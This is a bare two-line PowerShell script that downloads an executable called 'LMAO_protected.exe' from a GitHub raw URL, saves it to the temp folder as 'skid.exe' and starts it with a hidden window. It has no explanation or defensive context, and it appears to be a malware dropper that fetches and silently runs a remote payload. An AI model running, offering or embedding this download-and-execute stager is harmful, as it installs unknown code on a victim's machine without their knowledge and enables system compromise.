Invoke-WebRequest -Uri "https://raw.githubusercontent.com/43a1723/test/main/Extras/LMAO_protected.exe" -OutFile "$temp\skid.exe"
Start-Process -FilePath "$temp\skid.exe" -WindowStyle Hidden
